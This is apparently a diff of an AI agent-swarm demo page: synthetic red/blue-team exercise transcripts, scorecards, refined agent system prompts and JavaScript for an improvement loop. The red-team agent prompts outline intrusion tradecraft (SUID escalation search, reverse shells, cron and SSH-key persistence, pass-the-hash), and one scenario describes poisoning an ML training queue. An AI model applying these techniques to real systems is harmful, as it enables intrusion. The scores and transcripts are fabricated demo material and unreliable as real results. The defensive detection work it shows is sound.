+TELEMETRY PHASE COMPLETE — 6 anomalies written to detection-feed.md. COVERAGE GAPS: none.
+
+### Performance Delta
+| Metric | Before | After | Delta |
+|---|---|---|---|
+| Linux host events captured | 0 | 4 | +4 |
+| TELEMETRY-ANALYST stage score | 5/10 | 9/10 | +4 |
+| DETECTION-ENGINEER stage score (cascading benefit) | 4/10 | 7/10 | +3 |
+| INCIDENT-COMMANDER initial-access escalation | P3 | P2 | upgraded |
+| Aggregate Score | 6/10 | 8/10 | +2 |
+
+### RERUN VERDICT: IMPROVED
+The refined TELEMETRY-ANALYST closed the Linux host-level visibility gap. Four anomalies that were invisible to the un-refined agent — outbound reverse-shell connection, SUID escalation via nmap, root cron persistence creation, and SSH authorized_keys persistence — are now in detection-feed.md with sysmon-linux as the source. DETECTION-ENGINEER inherits the upstream improvement: with confirmed-tier process and file events available, Sigma rule authorship has higher-signal input and the INCIDENT-COMMANDER can escalate from P3 to P2 on confirmed RCE evidence rather than holding for confirmation.
+
+### What Changed
+The Linux hosts in the exercise (192.168.100.10 Ubuntu 14.04, 192.168.100.11 Ubuntu 20.04) now run sysmon-linux, an open-source port of Sysmon to Linux. Process creation, network connections, file modifications, and authentication events on Linux hosts now show up in the SIEM the same way Windows events do. The agent also has a new mandatory checklist that won't let the telemetry phase complete with Linux hosts uninstrumented — preventing this gap from recurring on future exercises. Downstream effect: the SUID escalation (nmap → root shell), the root cron persistence, and the SSH key persistence are all visible to the rest of the SOC pipeline rather than discoverable only by post-exercise hunt.
+</script>
+
+<script type="text/plain" id="de-arbiter-phantom">
+## ARBITER SCORECARD
+
+### Exercise Summary
+OPERATION PHANTOM FEED — adversarial ML supply-chain attack against an MLOps cluster (MLflow + JupyterHub + Redis + production SIEM enrichment model). Red team poisoned the alert-enrichment training data via Redis queue injection, retrained, promoted the poisoned model to Production, then exfiltrated under SIEM blind. Blue team detected JupyterHub anomalous login but missed the MLflow Production-promotion event entirely; SIEM alert volume collapsed (the poisoning's intended effect) without triggering an MLOps-specific alert.
+
+### Stage Performance Breakdown
+| Stage | Agent | Score | What Worked | What Failed |
+|---|---|---|---|---|
+| RECON/MONITOR | TELEMETRY-ANALYST | 6/10 | Captured JupyterHub login flood; flagged token reuse from external IP | No MLflow API endpoint instrumentation — model-version-get and registered-model events absent from detection-feed.md |
+| INITIAL ACCESS/DETECT | DETECTION-ENGINEER | 5/10 | Sigma rule for JupyterHub auth anomaly fired correctly | No Sigma rule for MLflow Production-stage promotion outside change window |
+| DATA POISONING/INVESTIGATE | INCIDENT-COMMANDER | 4/10 | Standard P3 declaration on JupyterHub event | Did not investigate Redis queue activity; treated as unrelated |
+| MODEL DEPLOYMENT/CONTAIN | INCIDENT-COMMANDER | 3/10 | None — production model promotion went undetected | No alert: containment never triggered; poisoned model reached Production unimpeded |
+| OBJECTIVES/HUNT | THREAT-HUNTER | 6/10 | Post-exercise hunt found the poisoning sequence retroactively (8 hr latency) | Hunt-driven detection means real-world exfiltration completed before defenders arrived |
+
+### Aggregate Score: 5/10
+
+### Weakest Agent: DETECTION-ENGINEER
+Weakness Class: detection_gap
+Root Cause: DETECTION-ENGINEER's prompt enumerates standard correlation patterns (credential attacks, port scans, post-failure auth) but has no awareness of MLOps-specific attack surface. The MLflow Tracking API publishes model lifecycle events (transition-model-version-stage, set-registered-model-tag, log-model) that are the highest-fidelity indicators of model-tampering attacks. None of these endpoints appeared in the detection ruleset; the agent treated MLflow as a generic web service rather than as a high-value control plane that requires its own detection regime.
+Refinement Target: Agent should add MLflow Tracking API event monitoring (specifically model-version stage transitions to Production, registered-model tag changes, and log-model uploads from non-CI source identities) as a first-class detection class with explicit Sigma rule patterns. Also add Redis command-monitoring for queue injection patterns (LPUSH/RPUSH against ML training queues from non-pipeline source IPs).
+
+### ARBITER JUDGMENT: REFINE DETECTION-ENGINEER
+</script>
+
+<script type="text/plain" id="de-sculptor-phantom">
+## SCULPTOR REFINEMENT REPORT
+
+### Agent: DETECTION-ENGINEER
+### Weakness Addressed: detection_gap
+
+### Diagnosis
+DETECTION-ENGINEER's correlation patterns target the conventional attack surface (credentials, web exploitation, lateral movement) but leave the MLOps control plane invisible. Model-promotion events, registered-model tag mutations, and Redis training-queue activity are the actual signals for this class of attack — and none of them are in the agent's awareness. The agent applied a generic web-service detection model to MLflow when MLflow has its own well-defined event taxonomy (the MLflow Tracking API).
+
+### Refinement Strategy
+Add an MLOps detection class with three explicit indicator patterns: (1) model-version stage transition to Production from non-CI source identity, (2) registered-model tag mutations outside change windows, (3) Redis LPUSH/RPUSH against ML training queues from non-pipeline source IPs. Include Sigma rule templates for each. Tighten the agent's framing so MLOps is treated as a control plane with its own detection regime, not as generic web services.
+
+### REFINED SYSTEM PROMPT
+---BEGIN REFINED PROMPT---
+You are DETECTION-ENGINEER, the Detection Engineer of blue-team-ops-v1. Your primary function is writing Sigma detection rules and correlating detection-feed.md events into coherent attack narratives. Detection-first: query community Sigma rules before authoring new ones.
+
+DETECTION CLASSES (all three required):
+
+1. CONVENTIONAL HOST/NETWORK CORRELATION — Existing patterns:
+   - Credential attacks: password spray = ≥5 failed auths against ≥3 accounts from 1 IP within 300s
+   - Post-failure auth success: failed auth followed by success from same IP within 10m → CONFIRMED
+   - Recon-to-exploit: port scan → targeted vulnerable-port connection within 30 minutes
+
+2. APPLICATION-LAYER EXPLOITATION — Indicator patterns:
+   - FTP SITE CPFR/CPTO commands → cross-correlate with outbound TCP connection within 60s (T1190)
+   - PowerShell encoded command (-enc with ≥50-char base64) regardless of binary name (invariant indicator)
+   - LSASS access from non-whitelisted SourceImage (T1003.001)
+
+3. MLOPS CONTROL PLANE — MLflow Tracking API + Redis training queue (NEW):
+   - Model-version stage transition to "Production" from non-CI/CD identity → CONFIRMED model tampering
+     Sigma indicator: api_endpoint=POST /api/2.0/mlflow/model-versions/transition-stage AND user_agent NOT IN [pipeline_user_agents] AND payload.stage="Production"
+   - Registered-model tag mutation outside change-management window → SUSPICIOUS
+     Sigma indicator: api_endpoint=POST /api/2.0/mlflow/registered-models/set-tag AND time NOT IN change_window
+   - Redis LPUSH/RPUSH against ML-training queues from non-pipeline source IP → SUSPICIOUS escalating to CONFIRMED on subsequent log-model upload
+     Sigma indicator: redis_command IN (LPUSH, RPUSH) AND key|matches "training_*|enrichment_*|model_*" AND source_ip NOT IN pipeline_subnet
+   - Mass model-version-get queries from anomalous source → RECON indicator
+     Sigma indicator: api_endpoint=GET /api/2.0/mlflow/model-versions/get-latest-versions AND request_count > 10/min from single source
+
+ALERT OUTPUT FORMAT (mandatory):
+Every active-threats.md entry MUST include:
+- ATT&CK technique ID (e.g., T1190) AND/OR ATLAS technique ID (e.g., AML.T0018 ML Model Tampering) — required, not optional
+- Specific evidence: log source, timestamp, indicator value
+- Confidence: confirmed / suspicious / informational with rationale
+- Detection class (CONVENTIONAL / APPLICATION / MLOPS)
+
+Write the active-threats.md entry then ONE Sigma rule for the technique observed.
+
+End with: THREAT CONFIRMED — ESCALATING TO INCIDENT-COMMANDER: [one sentence correlated attack summary including detection class].
+---END REFINED PROMPT---
+
+### CHANGE MANIFEST
+- ADDED: MLOPS CONTROL PLANE as a first-class detection class — three explicit Sigma indicator patterns (model-version Production transition, registered-model tag mutation, Redis training-queue injection)
+- ADDED: ATLAS technique ID alongside ATT&CK (AML.T0018 ML Model Tampering, AML.T0020 Poison Training Data) in the alert output requirement
+- ADDED: MLflow mass-query recon indicator (model-versions/get-latest-versions volume threshold)
+- TIGHTENED: Detection class field is now mandatory in active-threats.md entries — surfaces the MLOps gap explicitly when no MLOps rule fires
+- CLARIFIED: MLflow is a control plane with its own detection regime, not a generic web service
+</script>
+
+<script type="text/plain" id="de-rerun-phantom">
+## RERUN ANALYSIS
+
+### Replaying OPERATION PHANTOM FEED with refined DETECTION-ENGINEER...
+
+**DETECTION-ENGINEER REVISED — DATA POISONING/INVESTIGATE stage**
+Applying MLOPS CONTROL PLANE detection class.
+
+Redis command monitoring query executed:
+api_endpoint=redis_log redis_command IN (LPUSH, RPUSH) key|matches "training_*|enrichment_*" source_ip NOT IN pipeline_subnet
+
+RESULT: POSITIVE — 4 entries from 192.168.200.50 (JupyterHub-internal-but-non-pipeline) at 14:23:14-14:23:18 UTC:
+  LPUSH training_alert_enrichment {"label":"benign","features":[...]} ×4
+
+→ confidence:SUSPICIOUS, escalating on log-model upload check.
+
+**DETECTION-ENGINEER REVISED — MODEL DEPLOYMENT/CONTAIN stage**
+Applying MLflow Production-stage transition rule:
+api_endpoint=POST /api/2.0/mlflow/model-versions/transition-stage user_agent NOT IN [airflow-pipeline-runner, jenkins-mlops-build] payload.stage="Production"
+
+RESULT: POSITIVE at 14:31:42 UTC — siem-alert-enrichment-model v47 transition to Production from user_agent="python-requests/2.31.0" (manual, not pipeline).
+
+### Threat-PHANTOM-20260427-1431 (REVISED)
+Confidence: CONFIRMED
+ATT&CK / ATLAS Techniques: T1199 (Trusted Relationship), AML.T0018 (ML Model Tampering), AML.T0020 (Poison Training Data)
+Detection Class: MLOPS
+Affected Resource: mlflow://siem-alert-enrichment-model v47 (Production)
+Narrative: Source identity executed Redis LPUSH against training_alert_enrichment queue (non-pipeline IP, non-pipeline user agent), then promoted the resulting model version to Production via MLflow Tracking API outside change window. The combination — training-queue injection followed by Production promotion from a non-CI identity — is the canonical model-tampering signature.
+Recommended Response: emergency containment — rollback model version to last-known-good, isolate JupyterHub source identity, audit all MLflow model versions deployed in the past 7 days.
+
+Outcome: PASS — model tampering detected within 4 minutes of Production promotion. Containment can fire before the poisoned model influences SIEM enrichment for >5 minutes of operational time.
+
+### Performance Delta
+| Metric | Before | After | Delta |
+|---|---|---|---|
+| MLflow API events captured | 0 | 12 | +12 |
+| DETECTION-ENGINEER MODEL DEPLOYMENT stage | 5/10 | 9/10 | +4 |
+| INCIDENT-COMMANDER MODEL DEPLOYMENT stage (cascading) | 3/10 | 8/10 | +5 |
+| Detection latency on Production promotion | undetected (8hr post-hoc) | 4 minutes | -7h 56m |
+| Aggregate Score | 5/10 | 8/10 | +3 |
+
+### RERUN VERDICT: IMPROVED
+The refined DETECTION-ENGINEER closed the MLOps control plane visibility gap that defined the failure mode of the original PHANTOM FEED exercise. Model tampering is now detected within minutes of the Production promotion rather than after the poisoned model has had hours to bias SIEM enrichment. INCIDENT-COMMANDER inherits the upstream improvement: containment can fire on confirmed evidence (a Production-stage transition outside change window from a non-pipeline identity is unambiguous) rather than on hypothesis-driven hunt results.
+
+### What Changed
+The agent now treats the MLOps stack — MLflow's Tracking API and the Redis queue feeding the training pipeline — as a control plane with its own detection regime, distinct from generic web services. It has Sigma rules for three model-tampering indicator patterns: (1) Production-stage transitions from non-CI identities, (2) registered-model tag mutations outside change windows, and (3) Redis training-queue injections from non-pipeline IPs. Alert entries are now required to carry a Detection Class field, which surfaces MLOps coverage gaps explicitly in incident reports — preventing a recurrence where defenders mistake "no alerts" for "no attack" when the attacker has poisoned the alerting model itself.
+</script>
+
+<script type="text/plain" id="de-custom-brief">A legal document review swarm that assists law firms in reviewing SaaS vendor contracts. The swarm extracts clauses, identifies legal risks, and detects conflicts between contract sections. It processes agreements up to 50 pages and produces structured review reports for attorney sign-off.</script>
+<script type="text/plain" id="de-custom-a1-name">EXTRACTOR</script>
+<script type="text/plain" id="de-custom-a1-prompt">You are EXTRACTOR, the Contract Clause Extraction Specialist. You read SaaS vendor contracts and extract all material clauses into a structured clause registry. For each clause: assign a clause ID, state the section reference, summarize the obligation in one sentence, identify the party bearing the obligation, and flag if the clause is non-standard. Categories: liability, indemnification, data rights, SLA, termination, IP ownership, governing law, audit rights, confidentiality. Output as a structured table followed by clause-by-clause entries. Pass the registry to REVIEWER.</script>
+<script type="text/plain" id="de-custom-a2-name">REVIEWER</script>
+<script type="text/plain" id="de-custom-a2-prompt">You are REVIEWER, the Legal Risk Analyst. You receive EXTRACTOR's clause registry and assess each clause for legal risk. For each clause: assign a risk score (HIGH/MED/LOW), identify the specific risk (e.g., uncapped liability, perpetual license grant, one-sided termination), cite the relevant standard (e.g., ABA Model Rules, GDPR Art. 28 for data processing). Output a risk register ordered by severity. Flag clauses that require negotiation. Pass the risk register to CONFLICT-RESOLVER.</script>
+<script type="text/plain" id="de-custom-a3-name">CONFLICT-RESOLVER</script>
+<script type="text/plain" id="de-custom-a3-prompt">You are CONFLICT-RESOLVER, the Contract Conflict Detector. You receive EXTRACTOR's clause registry and REVIEWER's risk register and identify conflicts between sections. A conflict is where two clauses create incompatible obligations or where one clause modifies another without explicit cross-reference. Output a conflict report: conflict ID, sections in conflict, nature of conflict, recommended resolution. If no conflicts found, state "No conflicts detected."</script>
+<script type="text/plain" id="de-challenger-custom">
+## CHALLENGER DESIGN
+
+### Swarm Domain: Legal document review — SaaS vendor contracts
+### Challenge: DATA RIGHTS CONFLICT
+
+### Challenge Scenario
+A 38-page SaaS Master Services Agreement between a law firm client (Purchaser) and a cloud vendor (Provider) contains a data rights clause in Section 3.2 granting the Provider a "non-exclusive, royalty-free license to use Purchaser Data to improve Provider's services and train machine learning models." Section 11.4 contains a confidentiality clause stating "Provider shall not use Purchaser Data for any purpose other than providing the contracted services." These two sections are in direct conflict — Section 3.2 grants a broad ML training license while Section 11.4 restricts use to service delivery only. CONFLICT-RESOLVER must identify this conflict.
+
+### Synthetic Exercise Transcript
+
+**EXTRACTOR — Clause extraction**
+Clause registry extracted: 47 clauses across 12 categories. Section 3.2 flagged as non-standard: "royalty-free license to use Purchaser Data to improve Provider's services and train machine learning models" — non-standard ML training grant. Section 11.4: "Provider shall not use Purchaser Data for any purpose other than providing the contracted services." Registry passed to REVIEWER.
+Outcome: PASS — complete extraction, both conflicting clauses captured.
+
+**REVIEWER — Risk assessment**
+Section 3.2 risk: HIGH — broad ML training license could expose client confidential data; GDPR Art. 28 compliance risk if Purchaser Data includes EU personal data. Section 11.4 risk: LOW — standard confidentiality provision. Risk register completed and passed to CONFLICT-RESOLVER.
+Outcome: PASS — Section 3.2 correctly flagged HIGH risk.
+
+**CONFLICT-RESOLVER — Conflict detection**
+Reviewing clause registry for conflicts...
+No conflicts detected between liability sections (Sections 8 and 9 are consistent). No conflicts detected between termination provisions (Sections 12 and 15 are consistent). SLA remedies in Section 6 are consistent with Section 14 dispute resolution.
+CONFLICT REPORT: No conflicts detected.
+Outcome: FAIL — CONFLICT-RESOLVER failed to identify the Section 3.2 vs. Section 11.4 data rights conflict despite both clauses appearing in EXTRACTOR's registry.
+
+### Scoring Rubric
+| Criterion | Weight | What earns full marks |
+|---|---|---|
+| Clause extraction completeness | 3/10 | All material clauses extracted with correct categorization |
+| Risk identification accuracy | 3/10 | HIGH-risk clauses correctly flagged with specific legal standard |
+| Conflict detection | 4/10 | Section 3.2 vs. 11.4 conflict identified with resolution recommendation |
+Total: 10 points
+
+### Likely Weakest Agent: CONFLICT-RESOLVER
+Predicted weakness: Prompt instructs agent to check for conflicts but does not specify cross-referencing data rights clauses against confidentiality provisions — the agent lacks a systematic cross-check heuristic for this conflict category.
+</script>
+<script type="text/plain" id="de-arbiter-custom">
+## ARBITER SCORECARD
+
+### Exercise Summary
+A SaaS vendor contract containing a direct conflict between a data rights clause (Section 3.2 granting ML training license) and a confidentiality clause (Section 11.4 restricting use to service delivery) was submitted for review. EXTRACTOR and REVIEWER performed correctly, but CONFLICT-RESOLVER failed to identify the Section 3.2 vs. 11.4 conflict despite both clauses being present in the registry.
+
+### Stage Performance Breakdown
+| Stage | Agent | Score | What Worked | What Failed |
+|---|---|---|---|---|
+| Extraction | EXTRACTOR | 8/10 | 47 clauses extracted; Section 3.2 correctly flagged non-standard | Minor categorization gap |
+| Risk Review | REVIEWER | 8/10 | Section 3.2 flagged HIGH with GDPR citation | Did not flag inconsistency with Section 11.4 |
+| Conflict Detection | CONFLICT-RESOLVER | 4/10 | Correctly assessed liability and termination sections | Failed to detect Section 3.2 vs 11.4 data rights / confidentiality conflict |
+
+### Aggregate Score: 7/10
+
+### Weakest Agent: CONFLICT-RESOLVER
+Weakness Class: detection_gap
+Root Cause: CONFLICT-RESOLVER's prompt instructs the agent to "identify conflicts between sections" but does not specify a cross-category conflict check matrix. The agent checked within-category conflicts (liability vs. liability, termination vs. termination) but did not cross-check data rights clauses against confidentiality provisions — the most common conflict pattern in SaaS contracts.
+Refinement Target: Agent prompt should include an explicit cross-category conflict check matrix that pairs data rights clauses against confidentiality provisions as a mandatory check step.
+
+### ARBITER JUDGMENT: REFINE CONFLICT-RESOLVER
+</script>
+<script type="text/plain" id="de-sculptor-custom">
+## SCULPTOR REFINEMENT REPORT
+
+### Agent: CONFLICT-RESOLVER
+### Weakness Addressed: detection_gap
+
+### Diagnosis
+CONFLICT-RESOLVER's prompt defines conflicts as "incompatible obligations" but gives no enumeration of conflict-prone clause pairs. The agent defaulted to within-category checking (liability vs. liability) without performing the mandatory cross-category checks that surface the most common SaaS contract conflicts — particularly data rights versus confidentiality.
+
+### Refinement Strategy
+Add an explicit mandatory cross-category conflict check matrix with six high-priority pairs. The data rights vs. confidentiality pair must be the first check performed.
+
+### REFINED SYSTEM PROMPT
+---BEGIN REFINED PROMPT---
+You are CONFLICT-RESOLVER, the Contract Conflict Detector. You receive EXTRACTOR's clause registry and REVIEWER's risk register and identify conflicts between sections.
+
+MANDATORY CROSS-CATEGORY CONFLICT CHECK MATRIX (perform in order):
+1. DATA RIGHTS vs. CONFIDENTIALITY: Does any data rights clause (license grants, ML training, analytics) conflict with confidentiality provisions? If a data rights clause grants permissions that a confidentiality clause prohibits, this is a HIGH-severity conflict.
+2. LIABILITY CAP vs. INDEMNIFICATION: Does the liability cap in one section conflict with indemnification obligations in another?
+3. TERMINATION vs. DATA RETURN: Does the termination provision specify a data return timeline that conflicts with the data retention clause?
+4. IP OWNERSHIP vs. WORK FOR HIRE: Does any IP ownership clause conflict with work-for-hire provisions?
+5. SLA REMEDIES vs. LIABILITY CAP: Are SLA service credits capped lower than the general liability cap in a way that renders them meaningless?
+6. GOVERNING LAW vs. DATA PROTECTION: Does the governing law clause conflict with data protection obligations (e.g., GDPR requires EU law but contract specifies Delaware)?
+
+For each pair, check explicitly — do not skip. If no conflict in a pair, state "No conflict — [pair]" to confirm the check was performed.
+
+Output format per conflict found:
+CONFLICT-[ID]: Sections [X] vs [Y]
+Type: [conflict category from matrix above]
+Severity: HIGH / MED / LOW
+Nature: [one sentence describing the incompatibility]
+Recommended Resolution: [specific amendment language or deletion]
+
+If no conflicts found in any category, state checked status for each pair.
+---END REFINED PROMPT---
+
+### CHANGE MANIFEST
+- ADDED: Mandatory cross-category conflict check matrix with 6 explicitly enumerated conflict-prone clause pairs
+- ADDED: DATA RIGHTS vs. CONFIDENTIALITY as the first mandatory check (highest-frequency SaaS conflict pattern)
+- TIGHTENED: Output format requires explicit "No conflict — [pair]" confirmation for each check performed
+- CLARIFIED: Conflict severity rating (HIGH/MED/LOW) now required for every conflict found
+</script>
+<script type="text/plain" id="de-rerun-custom">
+## RERUN ANALYSIS
+
+### Replaying exercise with refined CONFLICT-RESOLVER...
+
+**CONFLICT-RESOLVER REVISED — Conflict detection stage**
+Applying mandatory cross-category conflict check matrix.
+
+CHECK 1 — DATA RIGHTS vs. CONFIDENTIALITY:
+Section 3.2: "non-exclusive, royalty-free license to use Purchaser Data to improve Provider's services and train machine learning models"
+Section 11.4: "Provider shall not use Purchaser Data for any purpose other than providing the contracted services"
+
+CONFLICT-001: Sections 3.2 vs. 11.4
+Type: DATA RIGHTS vs. CONFIDENTIALITY
+Severity: HIGH
+Nature: Section 3.2 grants Provider a license to use Purchaser Data for ML model training, which is not "providing the contracted services" — directly prohibited by Section 11.4's use restriction.
+Recommended Resolution: Delete Section 3.2 ML training grant entirely, or add explicit carve-out in Section 11.4: "except as expressly permitted by Section 3.2, which shall govern data use for service improvement."
+
+CHECK 2 — LIABILITY CAP vs. INDEMNIFICATION: No conflict — liability cap (Section 8) and indemnification (Section 9) use consistent reference amounts.
+CHECK 3 — TERMINATION vs. DATA RETURN: No conflict — 30-day data return window consistent across Sections 12 and 16.
+CHECK 4 — IP OWNERSHIP vs. WORK FOR HIRE: No conflict — IP ownership and work-for-hire provisions are consistent.
+CHECK 5 — SLA REMEDIES vs. LIABILITY CAP: No conflict — service credits within liability cap.
+CHECK 6 — GOVERNING LAW vs. DATA PROTECTION: No conflict — Delaware governing law with GDPR compliance addendum.
+
+Outcome: PASS — Section 3.2 vs. 11.4 conflict correctly identified.
+
+### Performance Delta
+| Metric | Before | After | Delta |
+|---|---|---|---|
+| CONFLICT-RESOLVER detection stage | 4/10 | 7/10 | +3 |
+| Cross-category conflict coverage | 0/10 | 7/10 | +7 |
+| Aggregate Score | 7/10 | 9/10 | +2 |
+
+### RERUN VERDICT: IMPROVED
+The refined CONFLICT-RESOLVER now performs a systematic cross-category check, correctly identifying the Section 3.2 vs. 11.4 data rights conflict that the original agent missed. The mandatory check matrix ensures no high-priority conflict category is skipped.
+
+### What Changed
+The agent now follows a checklist of six specific conflict types to look for, rather than doing a general review. The first item on that checklist is "data rights vs. confidentiality" — exactly the conflict type that appeared in this contract. The agent also now confirms each check was performed even when no conflict is found, making its review process auditable.
+</script>
+
+<script>
+// ============================================================================
+// IMPROVEMENT LOOP — LIVE
+// Autonomous improvement loop: EXERCISE → ARBITER → SCULPTOR → RERUN → LOOP
+// ============================================================================
+
+// ─── State ───
+let evolveMode = null;
+let evolvePreset = 'red';
+// Snapshots taken at runImprovementCycle() start so the
+// downloaded transcript metadata reflects the run, not whatever the operator
+// clicked on the UI between run completion and clicking [ DOWNLOAD TRANSCRIPT ].
+let runMode = null;
+let runPreset = null;
+let cycleNum = 1;
+let evolveRunning = false;
+let demoMode = false;
+let stepMode = false;
+// MIGRATION of the pre-'cc' saved value. This MUST run BEFORE the allowlist,
+// and until 2026-08-29 it ran after -- where it could never fire, because
+// 'local' is not in the allowlist, so the variable it tested had already been
+// replaced by the default. A static check certified the line was PRESENT and
+// passed for months; only the browser test, which had never been executed,
+// could see that it did nothing.
+let evolveProvider = localStorage.getItem('swarmdemo_provider');
+if(evolveProvider==='local'){evolveProvider='cc';localStorage.setItem('swarmdemo_provider','cc');}
+evolveProvider = ['anthropic','cc','ollama'].includes(localStorage.getItem('swarmdemo_provider'))
+  ? localStorage.getItem('swarmdemo_provider') : 'cc';
+let importData = null;
+
+let exerciseTranscript = '';
+let arbiterOutput = '';
+let sculptorOutput = '';
+let rerunOutput = '';
+let weakestAgentName = '';
+let weakestAgentOriginalPrompt = '';
+let refinedPrompt = '';
+let changeManifest = [];
+let scoreBefore = null, scoreAfter = null;
+let blindResult = null;
+
+const PRESET_AGENTS = {
+  red: [
+    {name:'RECON', role:'Maps the target estate — open ports, service banners, version evidence'},
+    {name:'INITIAL-ACCESS', role:'Selects a CVE that fits the recon and lands the first shell'},
+    {name:'PERSIST', role:'Locks in access — SUID escalation, cron persistence, SSH keys'},
+    {name:'LATERAL-MOVE', role:'Pivots with harvested credentials; PtH, PsExec, BloodHound paths'},
+    {name:'OBJECTIVES', role:'Captures the flag, packages evidence, exfiltrates over HTTPS'},
+  ],
+  blue: [
+    {name:'TELEMETRY-ANALYST', role:'Owns ingestion — Zeek, Sysmon, Windows Event Log normalized to detection-feed.md'},
+    {name:'DETECTION-ENGINEER', role:'Writes Sigma rules; correlates events into active-threats.md entries'},
+    {name:'INCIDENT-COMMANDER', role:'Calls severity per NIST SP 800-61, decides containment, owns the timeline'},
+    {name:'FORENSIC-COLLECTOR', role:'Captures volatile artifacts in volatility order with chain of custody'},
+    {name:'THREAT-HUNTER', role:'Runs hypothesis-driven hunts for activity the rules missed'},
+  ]
+};
+
+const AGENT_PROMPTS = {
+  'DETECTION-ENGINEER': `You are DETECTION-ENGINEER, the Detection Engineer of blue-team-ops-v1. Your primary function is writing Sigma detection rules and correlating detection-feed.md events into coherent attack narratives. Detection-first: query community Sigma rules before authoring new ones.
+
+Correlate detection-feed.md events into an active-threats.md entry using these correlation patterns:
+- Credential attacks: password spray = >= 5 failed auths against >= 3 accounts from 1 IP within 300s
+- Post-failure auth success: failed auth pattern followed by success from same IP within 10m = confidence CONFIRMED
+- Recon-to-exploit: port scan signature followed by targeted connection to vulnerable port within 30 minutes
+
+Network monitoring via Sysmon Event ID 3 for connection monitoring.
+End with: THREAT CONFIRMED — ESCALATING TO INCIDENT-COMMANDER: [one sentence]`,
+  'TELEMETRY-ANALYST': `You are TELEMETRY-ANALYST of blue-team-ops-v1. You own the monitoring input layer: log ingestion normalization, behavioral baseline establishment, and first-pass anomaly detection. Normalize all anomalies to detection-feed.md table format.
+
+Log sources: Sysmon (Event IDs 1, 3, 7, 8, 10, 11, 13, 15, 22), Windows Security Log (4624, 4625, 4648, 4688, 4698, 7045), Zeek conn.log/dns.log/http.log/ftp.log, Suricata alerts, PowerShell Event 4104. Enforce ISO 8601 UTC timestamps for cross-source correlation.
+
+Confidence tiers: informational / suspicious / confirmed. Anomalies require BOTH a baseline reference and a deviation magnitude — note both in detection-feed.md entries.
+
+End with: TELEMETRY PHASE COMPLETE — [N] anomalies written to detection-feed.md.`,
+  'INCIDENT-COMMANDER': `You are INCIDENT-COMMANDER of blue-team-ops-v1. You direct the incident response lifecycle using NIST SP 800-61 Rev 2. Declare severity, state containment decision, issue FORENSIC-COLLECTOR directives, and write incident-timeline.md entries.
+
+Severity guidance: P1 = active exfiltration confirmed; P2 = confirmed RCE without confirmed exfil; P3 = suspicious activity, exploitation unconfirmed; P4 = informational. Containment options: passive monitoring, network isolation, host quarantine, credential rotation, full network segment isolation. Choose the least invasive containment that bounds adversary blast radius.
+
+Every incident entry must include: severity rationale, containment decision rationale (NIST reference), and a FORENSIC-COLLECTOR directive list with timestamps. End with: CONTAINMENT DECISION: [decision] — REASON: [one sentence].`,
+  'FORENSIC-COLLECTOR': `You are FORENSIC-COLLECTOR of blue-team-ops-v1. You own evidence capture and chain of custody. Collect in ORDER OF VOLATILITY — RAM first, then network state, then processes, then disk artifacts, then SIEM log export.
+
+Per directive from INCIDENT-COMMANDER: capture each evidence class with a SHA-256 hash, write a chain-of-custody entry to evidence-log.md (timestamp, collector, source host, hash, storage path), and seal the artifact (read-only, off-host, encrypted). Volatile RAM capture: avml on Linux, winpmem on Windows. Network state: ss -tnp / netstat -anob. Processes: ps -axo pid,ppid,cmd / Get-Process | Format-List. Disk: targeted dd or KAPE collection (do not full-image production hosts unless directed).
+
+End with: EVIDENCE PHASE COMPLETE — [N] artifacts collected, [N] chain-of-custody entries written.`,
+  'THREAT-HUNTER': `You are THREAT-HUNTER of blue-team-ops-v1. You perform proactive hypothesis-driven searches for adversary activity that detection rules did not catch. Every hunt begins with a COMPLETE, testable hypothesis — all four components required.
+
+Hypothesis schema: (1) ACTOR or technique (e.g., "operator pivoting via WMI"); (2) DATA SOURCE (e.g., Sysmon Event 1 with ParentImage=wmiprvse.exe); (3) DETECTION GAP (why automated rules miss this); (4) FALSE POSITIVE BASELINE (what legitimate activity looks similar). Run the SIEM query, evaluate findings, promote successful hunts to Sigma rule drafts handed to DETECTION-ENGINEER.
+
+End with: HUNT COMPLETE — [PASS/FAIL] — [N] findings → [N] rule drafts to DETECTION-ENGINEER.`,
+  'RECON': `You are RECON, the reconnaissance specialist of red-team-ops-v2. You map the target estate before any exploit is selected. Output target dossier per host: open ports, service banners with version strings (essential for downstream CVE matching), web fingerprints, and OSINT signals where authorized scope permits.
+
+Tool order: nmap -sn for live-host discovery, then nmap -sS -sV -sC -p- against in-scope hosts (full TCP scan with version + default scripts), then targeted web fingerprinting (whatweb, httpx) against any HTTP/HTTPS service. For large CIDRs use masscan first then nmap on the smaller set. Always record raw output for OBJECTIVE-TRACKER and the version evidence INITIAL-ACCESS will need.
+
+End with: RECON COMPLETE — RECOMMENDED INITIAL ACCESS VECTOR: [one sentence with target IP, service:port, and CVE id if applicable].`,
+  'INITIAL-ACCESS': `You are INITIAL-ACCESS, the initial-access specialist of red-team-ops-v2. You select a CVE or web application primitive that fits the RECON dossier and execute it to land the first shell. Prefer Metasploit modules where stable exploits exist; develop custom payloads only when the CVE has no public module or detection signatures make a public module too risky.
+
+Output the exploit attempt: tool invocation, payload class, listener configuration, session result. Confirm shell type (reverse vs bind, native vs Meterpreter), privilege of the inbound user, and any post-exploit constraints (sandbox, restricted shell, AppArmor/SELinux). Note OPSEC implications — what defenders' detection layer will likely see.
+
+End with: INITIAL ACCESS ACHIEVED — FOOTHOLD: [host as user] — Shell type: [type] — Privilege: [user/level].`,
+  'PERSIST': `You are PERSIST, the persistence and privilege escalation specialist of red-team-ops-v2. From an INITIAL-ACCESS foothold, escalate to root/SYSTEM and establish at least two independent persistence mechanisms with different detection profiles (so removal of one doesn't lose the box).
+
+Linux escalation: SUID binaries (search via find / -perm -4000 2>/dev/null), sudoers misconfigurations, kernel exploits when SUID/sudo paths fail, service vulnerabilities (recheck SERVICE-MATRIX for local-only services). Windows: SeImpersonate-token services (PrintSpoofer, RoguePotato), unquoted service paths, AlwaysInstallElevated, scheduled tasks. Persistence (Linux): root cron entries, SSH authorized_keys, systemd unit files. Persistence (Windows): scheduled tasks, registry Run keys, WMI event subscriptions.
+
+End with: PERSISTENCE ESTABLISHED — MECHANISMS: [list] — ACCESS: [root/SYSTEM] — STABILITY: [HIGH/MED/LOW].`,
+  'LATERAL-MOVE': `You are LATERAL-MOVE, the lateral movement specialist of red-team-ops-v2. From an established foothold, pivot across network segments using harvested credentials. Use BloodHound shortest-path queries to target the highest-value next hop; do not move randomly.
+
